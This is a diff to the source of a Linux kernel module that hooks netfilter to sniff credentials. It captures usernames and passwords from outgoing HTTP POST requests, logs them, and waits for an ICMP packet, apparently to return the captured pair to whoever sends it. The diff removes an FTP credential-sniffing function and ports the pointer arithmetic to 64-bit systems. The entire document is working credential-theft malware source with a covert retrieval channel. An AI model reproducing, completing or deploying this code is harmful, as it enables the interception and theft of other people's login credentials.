@@ -37,92 +37,9 @@ static unsigned short target_port = 0;
 struct nf_hook_ops  pre_hook;	       /* Incoming */
 struct nf_hook_ops  post_hook;	       /* Outgoing */
 
+
+
 /* Function that looks at an sk_buff that is known to be an FTP packet.
- * Looks for the USER and PASS fields and makes sure they both come from
- * the one host as indicated in the target_xxx fields */
-static void check_ftp(struct sk_buff *skb)
-{
-   struct tcphdr *tcp;
-   char *data;
-   int len = 0;
-   int i = 0;
-   
-   tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
-   //tcp为指针类型，32位系统中大小为4个字节，因此可以强转为同样是4个字节的int类型
-   data = (char *)((int)tcp + (int)(tcp->doff * 4));
-
-   /* Now, if we have a username already, then we have a target_ip.
-    * Make sure that this packet is destined for the same host. */
-   if (username)
-     if (ip_hdr(skb)->daddr != target_ip || tcp->source != target_port)
-       return;
-   
-   /* Now try to see if this is a USER or PASS packet */
-   if (strncmp(data, "USER ", 5) == 0) {          /* Username */
-      data += 5;
-      
-      if (username)  return;
-      
-      while (*(data + i) != '\r' && *(data + i) != '\n'
-	     && *(data + i) != '\0' && i < 15) {
-	 len++;
-	 i++;
-      }
-      
-      if ((username = kmalloc(len + 1, GFP_KERNEL)) == NULL)
-	return;
-      memset(username, 0x00, len + 1);
-      memcpy(username, data, len);
-      *(username + len) = '\0';	       /* NULL terminate */
-   } else if (strncmp(data, "PASS ", 5) == 0) {   /* Password */
-      data += 5;
-
-      /* If a username hasn't been logged yet then don't try logging
-       * a password */
-      if (username == NULL) return;
-      if (password)  return;
-      
-      while (*(data + i) != '\r' && *(data + i) != '\n'
-	     && *(data + i) != '\0' && i < 15) {
-	 len++;
-	 i++;
-      }
-
-      if ((password = kmalloc(len + 1, GFP_KERNEL)) == NULL)
-	return;
-      memset(password, 0x00, len + 1);
-      memcpy(password, data, len);
-      *(password + len) = '\0';	       /* NULL terminate */
-   } else if (strncmp(data, "QUIT", 4) == 0) {
-      /* Quit command received. If we have a username but no password,
-       * clear the username and reset everything */
-      if (have_pair)  return;
-      if (username && !password) {
-	 kfree(username);
-	 username = NULL;
-	 target_port = target_ip = 0;
-	 have_pair = 0;
-	 
-	 return;
-      }
-   } else {
-      return;
-   }
-
-   if (!target_ip)
-     target_ip = ip_hdr(skb)->daddr;
-   if (!target_port)
-     target_port = tcp->source;
-
-   if (username && password)
-     have_pair++;		       /* Have a pair. Ignore others until
-					* this pair has been read. */
-   if (have_pair)
-     printk("Have password pair!  U: %s   P: %s\n", username, password);
-}
-
-
-/* Function that looks at an sk_buff that is known to be an HTTP packet.
  * Looks for the USER and PASS fields and makes sure they both come from
  * the one host as indicated in the target_xxx fields */
 static void check_http(struct sk_buff *skb)
@@ -136,19 +53,19 @@ static void check_http(struct sk_buff *skb)
    int len,i;
 
    tcp = tcp_hdr(skb);
-   //64位系统中指针类型8个字节，因此强转为int会出错，可以转成同样为8字节的long型
-   data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
+
+   data = (unsigned char *)tcp + (unsigned char)(tcp->doff )*4;
+   //data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
 
 
 //   if (strstr(data,"Connection") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 
-	//check POST
-	//cookie中也有uid，但可能没有pwd，且没有&分隔，而提交的HTML数据在cookie的后面，可通过Upgrade-Insecure-Requests定位
-   if (strstr(data,"POST /") != NULL && strstr(data,"Upgrade-Insecure-Requests") != NULL 
-       	&& strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) { 
+  //check POST 
+  //find html data, and avoid cookie
+   if (strstr(data,"POST /") != NULL && strstr(data,"Upgrade-Insecure-Requests") != NULL&& strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) { 
 
-        checkhtml = strstr(data,"Upgrade-Insecure-Requests");
+        check_html = strstr(data,"Upgrade-Insecure-Requests");
 
-        printk("find POST html");
+        printk("find POST HTTP");
 
         name = strstr(check_html,"&uid=");
         name += 5;
@@ -177,6 +94,7 @@ static void check_http(struct sk_buff *skb)
           *(password + i) = passwd[i];
         }
         *(password + len) = '\0';
+	//printk("%s",password);
 
    } else {
 
@@ -192,7 +110,7 @@ static void check_http(struct sk_buff *skb)
    if (username && password)
      have_pair++;              /* Have a pair. Ignore others until
                     * this pair has been read. */
-   //printk("5555555555555555555555555555555555555555555555555555555555555555");
+   
    if (have_pair)
      printk("Have a uid&pwd pair!  U: %s   P: %s\n", username, password);
 }
@@ -211,7 +129,7 @@ static unsigned int watch_out(void *priv, struct sk_buff *skb,
 {
    struct sk_buff *sb = skb;
    struct tcphdr *tcp;
-   printk("post routing");
+   //printk("post routing");
    /* Make sure this is a TCP packet first */
    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
      return NF_ACCEPT;             /* Nope, not TCP */
@@ -226,7 +144,6 @@ static unsigned int watch_out(void *priv, struct sk_buff *skb,
     * have a username and password pair. */
    if (!have_pair)
    {
-     //check_ftp(sb);
      printk("check http");
      check_http(sb);
    }
@@ -251,14 +168,18 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
    struct icmphdr *icmp;
    char *cp_data;		       /* Where we copy data to in reply */
    unsigned int   taddr;	       /* Temporary IP holder */
-   printk("pre routing");
+   //printk("pre routing");
    /* Do we even have a username/password pair to report yet? */
    if (!have_pair)
      return NF_ACCEPT;
      
    /* Is this an ICMP packet? */
    if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
-     return NF_ACCEPT;
+{
+	//printk("not icmp\n");
+	return NF_ACCEPT;
+}
+     
    
    icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4); //+20 ip头
 
@@ -338,7 +259,7 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
 
 int init_module()
 {
-  
+  //struct net *net=NULL;
    pre_hook.hook     = watch_in;
    pre_hook.pf       = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
